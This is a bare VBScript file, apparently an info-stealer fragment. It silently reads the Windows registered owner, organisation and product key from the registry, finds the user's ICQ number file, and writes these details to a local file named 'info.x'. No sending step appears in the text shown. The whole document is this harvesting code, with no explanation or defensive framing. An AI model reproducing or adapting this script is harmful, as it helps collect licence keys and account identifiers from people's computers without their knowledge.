on error resume next
Set start = CreateObject("WScript.Shell")
coo = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
win = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductName")
org = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
key = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey")
Set cool = CreateObject("Scripting.FileSystemObject")
Set k = cool.GetFile(WScript.ScriptFullName)
Set f = cool.OpenTextFile(WScript.ScriptFullName, 1)
Set Map = cool.GetFolder("C:\Program Files\ICQ\UIN\")
Set a = Map.Files
For each target in a
ExtName = lcase(cool.GetExtensionName(target.Name))
if ExtName = "uin" then
fasf = target.name
end if
Set fso = CreateObject("Scripting.FileSystemObject")
Set t = fso.CreateTextFile("info.x", True)
t.Write "Name: " & coo & "(" & org & ") ICQ:[" & fasf & "] Key[" & key & "]" & vbCrLf
t.close
next